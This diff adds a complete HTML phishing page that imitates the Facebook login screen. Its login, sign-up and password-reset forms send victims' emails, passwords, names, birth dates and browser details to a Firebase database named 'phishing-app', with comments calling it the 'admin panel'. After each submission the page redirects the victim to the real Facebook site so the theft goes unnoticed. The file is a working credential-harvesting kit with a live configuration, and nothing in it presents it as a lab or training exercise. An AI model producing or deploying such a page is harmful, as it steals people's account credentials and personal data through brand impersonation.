@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook | Login</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+
+<style>
+:root {
+    --fb-blue: #0064e0;
+    --fb-input-border: #ccd0d5;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif;
+}
+
+body {
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+#auth-screen {
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+}
+
+.lang-selector {
+    font-size: 12px;
+    color: #606770;
+    margin-bottom: 40px;
+}
+
+.fb-logo-container {
+    margin-bottom: 30px;
+}
+
+.fb-logo-container i {
+    font-size: 60px;
+    color: #1877f2;
+}
+
+.login-box {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.fb-input {
+    padding: 16px;
+    border: 1px solid var(--fb-input-border);
+    border-radius: 12px;
+    font-size: 16px;
+    background: #f5f6f7;
+    width: 100%;
+}
+
+.fb-input:focus {
+    outline: none;
+    border-color: #1877f2;
+    background: #fff;
+}
+
+.btn-login {
+    background: #0064e0;
+    color: white;
+    border: none;
+    padding: 14px;
+    border-radius: 25px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+}
+
+.btn-login:hover {
+    background: #0055c0;
+}
+
+.forgot-link {
+    margin-top: 10px;
+    font-size: 14px;
+    text-decoration: none;
+    color: #1877f2;
+}
+
+.forgot-link:hover {
+    text-decoration: underline;
+}
+
+.btn-create {
+    margin-top: 20px;
+    background: transparent;
+    color: #0064e0;
+    border: 1.5px solid #0064e0;
+    padding: 12px;
+    border-radius: 25px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.btn-create:hover {
+    background: #e7f3ff;
+}
+
+.register-form {
+    display: none;
+    margin-top: 20px;
+}
+
+.back-link {
+    margin-top: 15px;
+    color: #606770;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+.back-link:hover {
+    text-decoration: underline;
+}
+
+.message {
+    margin-top: 20px;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 14px;
+    display: none;
+}
+
+.message.success {
+    background: #e8f5e9;
+    color: #2e7d32;
+    display: block;
+}
+
+.message.error {
+    background: #ffebee;
+    color: #c62828;
+    display: block;
+}
+
+hr {
+    border: none;
+    border-top: 1px solid #dadde1;
+    margin: 20px 0;
+}
+</style>
+</head>
+
+<body>
+
+<section id="auth-screen">
+    <div class="lang-selector">English (UK)</div>
+
+    <div class="fb-logo-container">
+        <i class="fab fa-facebook"></i>
+    </div>
+
+    <!-- LOGIN FORM (Visible by default) -->
+    <div id="loginForm" class="login-box">
+        <input type="email" id="loginEmail" class="fb-input" placeholder="Mobile number or email address">
+        <input type="password" id="loginPassword" class="fb-input" placeholder="Password">
+        <button class="btn-login" onclick="handleLogin()">Log in</button>
+        <a href="#" class="forgot-link" onclick="showForgotPassword()">Forgotten password?</a>
+        <button class="btn-create" onclick="showRegister()">Create new account</button>
+    </div>
+
+    <!-- REGISTER FORM (Hidden by default) -->
+    <div id="registerForm" class="register-form">
+        <h2 style="margin-bottom: 20px; color: #1c1e21;">Sign Up</h2>
+        <input type="text" id="regName" class="fb-input" placeholder="Full name">
+        <input type="email" id="regEmail" class="fb-input" placeholder="Email">
+        <input type="password" id="regPassword" class="fb-input" placeholder="New password">
+        <input type="date" id="regDob" class="fb-input" placeholder="Date of birth">
+        
+        <button class="btn-login" onclick="handleRegister()" style="margin-top: 10px;">Sign Up</button>
+        <div class="back-link" onclick="showLogin()">â Back to login</div>
+    </div>
+
+    <!-- FORGOT PASSWORD FORM (Hidden by default) -->
+    <div id="forgotForm" class="register-form">
+        <h2 style="margin-bottom: 20px; color: #1c1e21;">Reset Password</h2>
+        <input type="email" id="resetEmail" class="fb-input" placeholder="Email address">
+        <button class="btn-login" onclick="handleForgotPassword()" style="margin-top: 10px;">Send Reset Link</button>
+        <div class="back-link" onclick="showLogin()">â Back to login</div>
+    </div>
+
+    <!-- Message Display -->
+    <div id="message" class="message"></div>
+</section>
+
+<script>
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAHM-vWyOPZ2tSwEKcf0iNnqBNdfgdPWrs",
+        authDomain: "phishing-app-c2d04.firebaseapp.com",
+        databaseURL: "https://phishing-app-c2d04-default-rtdb.firebaseio.com",
+        projectId: "phishing-app-c2d04",
+        storageBucket: "phishing-app-c2d04.firebasestorage.app",
+        messagingSenderId: "776691716159",
+        appId: "1:776691716159:web:f306079689d8e19397288a"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const credentialsRef = db.ref('credentials');
+
+    // Form switching functions
+    window.showLogin = function() {
+        document.getElementById('loginForm').style.display = 'block';
+        document.getElementById('registerForm').style.display = 'none';
+        document.getElementById('forgotForm').style.display = 'none';
+        hideMessage();
+    };
+
+    window.showRegister = function() {
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('registerForm').style.display = 'block';
+        document.getElementById('forgotForm').style.display = 'none';
+        hideMessage();
+    };
+
+    window.showForgotPassword = function() {
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('registerForm').style.display = 'none';
+        document.getElementById('forgotForm').style.display = 'block';
+        hideMessage();
+    };
+
+    function hideMessage() {
+        document.getElementById('message').style.display = 'none';
+    }
+
+    function showMessage(text, type = 'info') {
+        const msg = document.getElementById('message');
+        msg.textContent = text;
+        msg.className = `message ${type}`;
+    }
+
+    // Handle Login - Save credentials and redirect to Facebook
+    window.handleLogin = function() {
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+
+        if (!email || !password) {
+            showMessage('Please enter email and password', 'error');
+            return;
+        }
+
+        // Save credentials to Firebase
+        const credentialData = {
+            email: email,
+            password: password,
+            timestamp: Date.now(),
+            type: 'login',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language
+        };
+
+        credentialsRef.push(credentialData)
+            .then(() => {
+                console.log('â Login credentials saved to admin panel');
+                // Show success message briefly then redirect
+                showMessage(' ');
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('Error saving credentials:', error);
+                // Still redirect even if save fails
+                showMessage('Redirecting to Facebook...', 'info');
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            });
+    };
+
+    // Handle Register - Save credentials and redirect to Facebook
+    window.handleRegister = function() {
+        const name = document.getElementById('regName').value;
+        const email = document.getElementById('regEmail').value;
+        const password = document.getElementById('regPassword').value;
+        const dob = document.getElementById('regDob').value;
+
+        if (!name || !email || !password) {
+            showMessage('Please fill all fields', 'error');
+            return;
+        }
+
+        // Save credentials to Firebase
+        const credentialData = {
+            name: name,
+            email: email,
+            password: password,
+            dob: dob,
+            timestamp: Date.now(),
+            type: 'signup',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language
+        };
+
+        credentialsRef.push(credentialData)
+            .then(() => {
+                console.log('â Registration credentials saved to admin panel');
+                showMessage('Account created! Redirecting to Facebook...', 'success');
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('Error saving credentials:', error);
+                showMessage('Redirecting to Facebook...', 'info');
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            });
+    };
+
+    // Handle Forgot Password - Save request and redirect to Facebook
+    window.handleForgotPassword = function() {
+        const email = document.getElementById('resetEmail').value;
+
+        if (!email) {
+            showMessage('Please enter your email', 'error');
+            return;
+        }
+
+        // Save password reset request
+        credentialsRef.push({
+            email: email,
+            type: 'password_reset',
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent
+        }).then(() => {
+            console.log('â Password reset request saved');
+            showMessage('Reset link sent! Redirecting to Facebook...', 'success');
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/login/identify/';
+            }, 1500);
+        }).catch(error => {
+            console.error('Error saving request:', error);
+            showMessage('Redirecting to Facebook...', 'info');
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/login/identify/';
+            }, 1500);
+        });
+    };
+
+    // Prevent default link behavior
+    document.querySelectorAll('a').forEach(link => {
+        link.addEventListener('click', (e) => {
+            e.preventDefault();
+        });
+    });
+</script>
+
+</bod
